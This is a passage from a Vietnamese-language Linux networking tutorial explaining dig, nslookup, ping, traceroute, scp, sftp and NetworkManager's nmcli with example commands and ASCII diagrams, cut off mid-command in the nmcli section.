<a href=#82-dig---dns-query-tool class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Basic query</span>
</span></span><span class=line><span class=cl>dig example.com                   <span class=c1># A record</span>
</span></span><span class=line><span class=cl>dig example.com AAAA              <span class=c1># IPv6</span>
</span></span><span class=line><span class=cl>dig example.com MX                <span class=c1># Mail servers</span>
</span></span><span class=line><span class=cl>dig example.com NS                <span class=c1># Name servers</span>
</span></span><span class=line><span class=cl>dig example.com TXT               <span class=c1># TXT records</span>
</span></span><span class=line><span class=cl>dig example.com ANY               <span class=c1># All records</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Short output</span>
</span></span><span class=line><span class=cl>dig +short example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Trace resolution path</span>
</span></span><span class=line><span class=cl>dig +trace example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Query specific DNS server</span>
</span></span><span class=line><span class=cl>dig @8.8.8.8 example.com
</span></span><span class=line><span class=cl>dig @1.1.1.1 example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reverse lookup</span>
</span></span><span class=line><span class=cl>dig -x 93.184.216.34
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Output sections:</span>
</span></span><span class=line><span class=cl><span class=c1># QUESTION: Query sent</span>
</span></span><span class=line><span class=cl><span class=c1># ANSWER: Response records</span>
</span></span><span class=line><span class=cl><span class=c1># AUTHORITY: Authoritative NS</span>
</span></span><span class=line><span class=cl><span class=c1># ADDITIONAL: Extra info (glue records)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Useful options</span>
</span></span><span class=line><span class=cl>dig +noall +answer example.com    <span class=c1># Only answer section</span>
</span></span><span class=line><span class=cl>dig +stats example.com            <span class=c1># Query statistics</span>
</span></span><span class=line><span class=cl>dig +dnssec example.com           <span class=c1># DNSSEC validation</span></span></span></code></pre></div><h3 class=heading-element id=83-nslookup><span>8.3 nslookup</span>
<a href=#83-nslookup class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Interactive mode</span>
</span></span><span class=line><span class=cl>nslookup
</span></span><span class=line><span class=cl>&gt; server 8.8.8.8
</span></span><span class=line><span class=cl>&gt; <span class=nb>set</span> <span class=nv>type</span><span class=o>=</span>MX
</span></span><span class=line><span class=cl>&gt; example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Non-interactive</span>
</span></span><span class=line><span class=cl>nslookup example.com
</span></span><span class=line><span class=cl>nslookup example.com 8.8.8.8      <span class=c1># Specific server</span>
</span></span><span class=line><span class=cl>nslookup -type<span class=o>=</span>MX example.com     <span class=c1># MX records</span>
</span></span><span class=line><span class=cl>nslookup -type<span class=o>=</span>NS example.com     <span class=c1># NS records</span></span></span></code></pre></div><h3 class=heading-element id=84-ping--traceroute><span>8.4 Ping & Traceroute</span>
<a href=#84-ping--traceroute class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                     ICMP PROTOCOL                           │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ping = ICMP Echo Request → ICMP Echo Reply
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│    ICMP Header                                               │
</span></span><span class=line><span class=cl>├──────────┬──────────┬────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│ Type (8) │ Code (0) │ Checksum                               │
</span></span><span class=line><span class=cl>├──────────┴──────────┴────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│ Identifier           │ Sequence Number                       │
</span></span><span class=line><span class=cl>├──────────────────────┴───────────────────────────────────────┤
</span></span><span class=line><span class=cl>│                         Data                                 │
</span></span><span class=line><span class=cl>└──────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>RTT (Round-Trip Time): Thời gian request → response
</span></span><span class=line><span class=cl>TTL (Time-To-Live): Giảm 1 mỗi hop, drop khi = 0</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Ping</span>
</span></span><span class=line><span class=cl>ping google.com
</span></span><span class=line><span class=cl>ping -c <span class=m>4</span> google.com              <span class=c1># 4 packets only</span>
</span></span><span class=line><span class=cl>ping -i 0.2 google.com            <span class=c1># Interval 0.2s</span>
</span></span><span class=line><span class=cl>ping -s <span class=m>1000</span> google.com           <span class=c1># Packet size 1000 bytes</span>
</span></span><span class=line><span class=cl>ping -f google.com                <span class=c1># Flood ping (root only)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Traceroute</span>
</span></span><span class=line><span class=cl>traceroute google.com
</span></span><span class=line><span class=cl>traceroute -n google.com          <span class=c1># Numeric (no DNS resolve)</span>
</span></span><span class=line><span class=cl>traceroute -T google.com          <span class=c1># TCP instead of UDP</span>
</span></span><span class=line><span class=cl>traceroute -I google.com          <span class=c1># ICMP instead of UDP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># mtr (realtime traceroute)</span>
</span></span><span class=line><span class=cl>mtr google.com
</span></span><span class=line><span class=cl>mtr -r -c <span class=m>10</span> google.com           <span class=c1># Report mode, 10 cycles</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                   TRACEROUTE ALGORITHM                      │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Gửi packets với TTL tăng dần:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TTL=1: Packet đến router 1 → TTL=0 → Router 1 gửi ICMP Time Exceeded
</span></span><span class=line><span class=cl>TTL=2: Packet qua router 1 → đến router 2 → TTL=0 → Router 2 gửi ICMP
</span></span><span class=line><span class=cl>TTL=3: Packet qua router 1, 2 → đến router 3 → ...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>TTL=n: Packet đến destination → ICMP Echo Reply (hoặc port unreachable)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Từ các ICMP responses, traceroute biết được path và RTT từng hop.</span></span></code></pre></div><hr><h2 class=heading-element id=phần-9-file-transfer-scp-sftp-ftp><span>PHẦN 9: FILE TRANSFER (SCP, SFTP, FTP)</span>
<a href=#ph%e1%ba%a7n-9-file-transfer-scp-sftp-ftp class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=91-so-sánh><span>9.1 So Sánh</span>
<a href=#91-so-s%c3%a1nh class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌──────────┬─────────────┬─────────────┬───────────────────────┐
</span></span><span class=line><span class=cl>│ Protocol │ Encryption  │ Features    │ Use case              │
</span></span><span class=line><span class=cl>├──────────┼─────────────┼─────────────┼───────────────────────┤
</span></span><span class=line><span class=cl>│ FTP      │ Không       │ Full        │ Legacy, internal only │
</span></span><span class=line><span class=cl>│ FTPS     │ TLS         │ Full        │ Secure FTP            │
</span></span><span class=line><span class=cl>│ SFTP     │ SSH         │ Full        │ Secure, interactive   │
</span></span><span class=line><span class=cl>│ SCP      │ SSH         │ Basic       │ Simple file copy      │
</span></span><span class=line><span class=cl>│ rsync    │ SSH (opt)   │ Delta sync  │ Backup, sync          │
</span></span><span class=line><span class=cl>└──────────┴─────────────┴─────────────┴───────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Recommendation:
</span></span><span class=line><span class=cl><span class=k>-</span> Cần interactive: SFTP
</span></span><span class=line><span class=cl><span class=k>-</span> Simple copy: SCP hoặc rsync
</span></span><span class=line><span class=cl><span class=k>-</span> Sync/backup: rsync
</span></span><span class=line><span class=cl>- Tránh: FTP (insecure)</span></span></code></pre></div><h3 class=heading-element id=92-scp><span>9.2 SCP</span>
<a href=#92-scp class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Local to remote</span>
</span></span><span class=line><span class=cl>scp file.txt user@server:/path/
</span></span><span class=line><span class=cl>scp -r directory/ user@server:/path/    <span class=c1># Recursive</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Remote to local</span>
</span></span><span class=line><span class=cl>scp user@server:/path/file.txt ./
</span></span><span class=line><span class=cl>scp -r user@server:/path/dir/ ./
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Between remote servers</span>
</span></span><span class=line><span class=cl>scp user1@server1:/file user2@server2:/path/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Options</span>
</span></span><span class=line><span class=cl>scp -P <span class=m>2222</span> file.txt user@server:/path/     <span class=c1># Custom port</span>
</span></span><span class=line><span class=cl>scp -i ~/.ssh/key file.txt user@server:/    <span class=c1># Specific key</span>
</span></span><span class=line><span class=cl>scp -C file.txt user@server:/path/          <span class=c1># Compression</span>
</span></span><span class=line><span class=cl>scp -l <span class=m>1000</span> file.txt user@server:/path/     <span class=c1># Limit bandwidth (Kbit/s)</span></span></span></code></pre></div><h3 class=heading-element id=93-sftp><span>9.3 SFTP</span>
<a href=#93-sftp class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Interactive session</span>
</span></span><span class=line><span class=cl>sftp user@server
</span></span><span class=line><span class=cl>sftp&gt; <span class=nb>pwd</span>                  <span class=c1># Remote current directory</span>
</span></span><span class=line><span class=cl>sftp&gt; lpwd                 <span class=c1># Local current directory</span>
</span></span><span class=line><span class=cl>sftp&gt; ls                   <span class=c1># Remote listing</span>
</span></span><span class=line><span class=cl>sftp&gt; lls                  <span class=c1># Local listing</span>
</span></span><span class=line><span class=cl>sftp&gt; <span class=nb>cd</span> /path             <span class=c1># Change remote directory</span>
</span></span><span class=line><span class=cl>sftp&gt; lcd /local/path      <span class=c1># Change local directory</span>
</span></span><span class=line><span class=cl>sftp&gt; get file.txt         <span class=c1># Download</span>
</span></span><span class=line><span class=cl>sftp&gt; get -r directory/    <span class=c1># Download recursive</span>
</span></span><span class=line><span class=cl>sftp&gt; put file.txt         <span class=c1># Upload</span>
</span></span><span class=line><span class=cl>sftp&gt; put -r directory/    <span class=c1># Upload recursive</span>
</span></span><span class=line><span class=cl>sftp&gt; mkdir newdir         <span class=c1># Create remote directory</span>
</span></span><span class=line><span class=cl>sftp&gt; rm file.txt          <span class=c1># Delete remote file</span>
</span></span><span class=line><span class=cl>sftp&gt; quit                 <span class=c1># Exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Non-interactive (batch mode)</span>
</span></span><span class=line><span class=cl>sftp -b commands.txt user@server
</span></span><span class=line><span class=cl><span class=c1># commands.txt:</span>
</span></span><span class=line><span class=cl><span class=c1># cd /upload</span>
</span></span><span class=line><span class=cl><span class=c1># put file.txt</span>
</span></span><span class=line><span class=cl><span class=c1># quit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Single command</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;get /path/file.txt&#34;</span> <span class=p>|</span> sftp user@server</span></span></code></pre></div><hr><h2 class=heading-element id=phần-10-networkmanager--nmcli><span>PHẦN 10: NETWORKMANAGER & NMCLI</span>
<a href=#ph%e1%ba%a7n-10-networkmanager--nmcli class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=101-networkmanager-architecture><span>10.1 NetworkManager Architecture</span>
<a href=#101-networkmanager-architecture class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│              NETWORKMANAGER ARCHITECTURE                    │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NetworkManager = Daemon quản lý network connections
</span></span><span class=line><span class=cl><span class=k>-</span> Default trên hầu hết distros hiện đại (RHEL 7+, Ubuntu 17+, Fedora)
</span></span><span class=line><span class=cl><span class=k>-</span> Quản lý: Ethernet, WiFi, VPN, Mobile broadband, DSL
</span></span><span class=line><span class=cl><span class=k>-</span> Auto-detect và auto-configure
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                      User Space                             │
</span></span><span class=line><span class=cl>│   ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐        │
</span></span><span class=line><span class=cl>│   │  nmcli  │  │  nmtui  │  │nm-applet│  │ Settings│        │
</span></span><span class=line><span class=cl>│   │  (CLI)  │  │  (TUI)  │  │  (Tray) │  │  (GUI)  │        │
</span></span><span class=line><span class=cl>│   └────┬────┘  └────┬────┘  └────┬────┘  └────┬────┘        │
</span></span><span class=line><span class=cl>│        │            │            │            │             │
</span></span><span class=line><span class=cl>│        └────────────┴─────┬──────┴────────────┘             │
</span></span><span class=line><span class=cl>│                           │ D-Bus                           │
</span></span><span class=line><span class=cl>│                    ┌──────▼───────┐                         │
</span></span><span class=line><span class=cl>│                    │NetworkManager│                         │
</span></span><span class=line><span class=cl>│                    │    Daemon    │                         │
</span></span><span class=line><span class=cl>│                    └─────┬────────┘                         │
</span></span><span class=line><span class=cl>└──────────────────────────│──────────────────────────────────┘
</span></span><span class=line><span class=cl>                           │
</span></span><span class=line><span class=cl>┌──────────────────────────│──────────────────────────────────┐
</span></span><span class=line><span class=cl>│                     Kernel│Space                            │
</span></span><span class=line><span class=cl>│                    ┌─────▼─────┐                            │
</span></span><span class=line><span class=cl>│                    │  Netlink  │                            │
</span></span><span class=line><span class=cl>│                    └─────┬─────┘                            │
</span></span><span class=line><span class=cl>│                          │                                  │
</span></span><span class=line><span class=cl>│    ┌─────────────────────┼─────────────────────┐            │
</span></span><span class=line><span class=cl>│    │                     │                     │            │
</span></span><span class=line><span class=cl>│ ┌──▼──┐              ┌───▼───┐            ┌───▼───┐         │
</span></span><span class=line><span class=cl>│ │ eth0│              │ wlan0 │            │ tun0  │         │
</span></span><span class=line><span class=cl>│ └─────┘              └───────┘            └───────┘         │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Key concepts:
</span></span><span class=line><span class=cl><span class=k>-</span> Device: Physical/virtual network interface (eth0, wlan0)
</span></span><span class=line><span class=cl><span class=k>-</span> Connection: Configuration profile (có thể nhiều connection cho 1 device)
</span></span><span class=line><span class=cl><span class=k>-</span> Active connection: Connection đang được apply vào device
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Config files: /etc/NetworkManager/system-connections/</span></span></code></pre></div><h3 class=heading-element id=102-nmcli-cú-pháp><span>10.2 nmcli Cú Pháp</span>
<a href=#102-nmcli-c%c3%ba-ph%c3%a1p class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmcli <span class=o>[</span>OPTIONS<span class=o>]</span> OBJECT COMMAND
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># OBJECTS:</span>
</span></span><span class=line><span class=cl>general         <span class=c1># NetworkManager status</span>
</span></span><span class=line><span class=cl>networking      <span class=c1># Network control (on/off)</span>
</span></span><span class=line><span class=cl>connection      <span class=c1># Connection profiles</span>
</span></span><span class=line><span class=cl>device          <span class=c1># Network devices</span>
</span></span><span class=line><span class=cl>radio           <span class=c1># WiFi/WWAN radio</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># OPTIONS:</span>
</span></span><span class=line><span class=cl>-t, --terse     <span class=c1># Machine-readable output</span>
</span></span><span class=line><span class=cl>-p, --pretty    <span class=c1># Human-readable output</span>
</span></span><span class=line><span class=cl>-c, --colors    <span class=c1># Color output</span>
</span></span><span class=line><span class=cl>-f, --fields    <span class=c1># Specify output fields</span></span></span></code></pre></div><h3 class=heading-element id=103-xem-trạng-thái><span>10.3 Xem Trạng Thái</span>
<a href=#103-xem-tr%e1%ba%a1ng-th%c3%a1i class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># NetworkManager status</span>
</span></span><span class=line><span class=cl>nmcli general status
</span></span><span class=line><span class=cl><span class=c1># STATE      CONNECTIVITY  WIFI-HW   WIFI      WWAN-HW   WWAN</span>
</span></span><span class=line><span class=cl><span class=c1># connected  full          enabled   enabled   enabled   enabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Liệt kê devices</span>
</span></span><span class=line><span class=cl>nmcli device status
</span></span><span class=line><span class=cl><span class=c1># DEVICE   TYPE      STATE         CONNECTION</span>
</span></span><span class=line><span class=cl><span class=c1># eth0     ethernet  connected     Wired connection 1</span>
</span></span><span class=line><span class=cl><span class=c1># wlan0    wifi      disconnected  --</span>
</span></span><span class=line><span class=cl><span class=c1># lo       loopback  unmanaged     --</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Liệt kê connections</span>
</span></span><span class=line><span class=cl>nmcli connection show
</span></span><span class=line><span class=cl><span class=c1># NAME                 UUID                                  TYPE      DEVICE</span>
</span></span><span class=line><span class=cl><span class=c1># Wired connection 1   a1b2c3d4-e5f6-...                     ethernet  eth0</span>
</span></span><span class=line><span class=cl><span class=c1># My WiFi              f6e5d4c3-b2a1-...                     wifi      --</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Chi tiết connection</span>
</span></span><span class=line><span class=cl>nmcli connection show <span class=s2>&#34;Wired connection 1&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># connection.id:              Wired connection 1</span>
</span></span><span class=line><span class=cl><span class=c1># connection.type:            802-3-ethernet</span>
</span></span><span class=line><span class=cl><span class=c1># ipv4.method:                auto</span>
</span></span><span class=line><span class=cl><span class=c1># ipv4.addresses:             --</span>
</span></span><span class=line><span class=cl><span class=c1># ipv4.gateway:               --</span>
</span></span><span class=line><span class=cl><span class=c1># ipv4.dns:                   --</span>
</span></span><span class=line><span class=cl><span class=c1># ...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Chi tiết device</span>
</span></span><span class=line><span class=cl>nmcli device show eth0</span></span></code></pre></div><h3 class=heading-element id=104-quản-lý-connections><span>10.4 Quản Lý Connections</span>
<a href=#104-qu%e1%ba%a3n-l%c3%bd-connections class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Bật/tắt connection</span>
</span></span><span class=line><span class=cl>nmcli connection up <span class=s2>&#34;Wired connection 1&#34;</span>
</span></span><span class=line><span class=cl>nmcli connection down <span class=s2>&#34;Wired connection 1&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tạo connection mới (DHCP)</span>
</span></span><span class=line><span class=cl>nmcli connection add <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=nb>type</span> ethernet <span class=se>\
